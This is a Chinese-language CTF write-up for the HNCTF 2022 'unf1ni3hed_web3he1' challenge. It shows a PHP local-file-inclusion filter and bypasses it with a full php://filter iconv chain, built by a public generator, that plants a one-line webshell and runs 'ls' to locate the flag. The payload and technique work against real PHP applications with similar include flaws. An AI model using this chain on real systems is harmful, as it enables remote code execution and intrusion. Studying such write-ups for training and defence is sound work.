---
title: '[HNCTF 2022 WEEK4]unf1ni3hed_web3he1'
date: 2024-07-30 22:03:35
tags: 文件包含
categories: 刷题笔记
---

### [HNCTF 2022 WEEK4]unf1ni3hed_web3he1

我们打开页面，提示传个cmd，我们传了后，就会跳转到“你被骗了”视频

![image-20240730220448957](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202407302204252.png)

我们进行抓包，果然，再抓包里发现真正的文件

![image-20240730220530573](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202407302205627.png)

我们访问看看

![image-20240730220948153](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202407302209221.png)

根据提示，我们访问t00llll.php，成功进入下一个页面

```
<?php
error_reporting(0);

if (!isset($_GET['include_'])) {
    echo "使用工具的时候,要轻一点哦~";
    show_source(__FILE__);
}else{
    $include_ = $_GET['include_'];
}
if (preg_match('/sess|tmp/i', $include_)) {
    die("可恶涅,同样的方法怎么可能骗到本小姐两次!");
}else if (preg_match('/sess|tmp|index|\~|\@|flag|g|\%|\^|\&|data|log/i', $include_)) {
    die("呜呜呜,不可以包含这些奇奇怪怪的东西欸!!");
}
else @include($include_);

?>
```

### 非预期解

我们使用php filter chain链

https://github.com/synacktiv/php_filter_chain_generator

我们构造filter链

```
python php_filter_chain_generator.py --chain "<?=`$_GET[0]`;;?>"
```

我们先查看目录

```
php://filter/convert.iconv.UTF8.CSISO2022KR|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.JS.UNICODE|convert.iconv.L4.UCS2|convert.iconv.UCS-4LE.OSF05010001|convert.iconv.IBM912.UTF-16LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.851.UTF-16|convert.iconv.L1.T.618BIT|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.IBM869.UTF16|convert.iconv.L3.CSISO90|convert.iconv.R9.ISO6937|convert.iconv.OSF00010100.UHC|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.851.UTF-16|convert.iconv.L1.T.618BIT|convert.iconv.ISO-IR-103.850|convert.iconv.PT154.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.IBM869.UTF16|convert.iconv.L3.CSISO90|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.IBM932.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP367.UTF-16|convert.iconv.CSIBM901.SHIFT_JISX0213|convert.iconv.UHC.CP1361|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.ISO-IR-111.UJIS|convert.iconv.852.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UTF16.EUCTW|convert.iconv.CP1256.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.865.UTF16|convert.iconv.CP901.ISO6937|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.ISO-2022-KR.UTF16|convert.iconv.ISO-IR-139.UTF-16|convert.iconv.ISO-IR-157.ISO-IR-156|convert.iconv.WINDOWS-1258.ISO_6937|convert.iconv.KOI8-T.ISO-2022-JP-3|convert.iconv.CP874.ISO2022KR|convert.iconv.CSUNICODE.UTF-8|convert.iconv.OSF00010004.UTF32BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.8859_3.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.PT.UTF32|convert.iconv.KOI8-U.IBM-932|convert.iconv.SJIS.EUCJP-WIN|convert.iconv.L10.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP367.UTF-16|convert.iconv.CSIBM901.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.PT.UTF32|convert.iconv.KOI8-U.IBM-932|convert.iconv.SJIS.EUCJP-WIN|convert.iconv.L10.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP367.UTF-16|convert.iconv.CSIBM901.SHIFT_JISX0213|convert.iconv.UHC.CP1361|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CSIBM1161.UNICODE|convert.iconv.ISO-IR-156.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.ISO2022KR.UTF16|convert.iconv.L6.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.IBM932.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.UCS-2LE.UCS-2BE|convert.iconv.TCVN.UCS2|convert.iconv.857.SHIFTJISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.base64-decode/resource=php://temp&0=ls ../../../
```

发现一个secret文件夹

![image-20240730222810183](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202407302228264.png)

我们访问这个文件夹，发现flag

![image-20240730222838853](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202407302228900.png)

访问flag

![image-20240730222902912](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202407302229120.png)
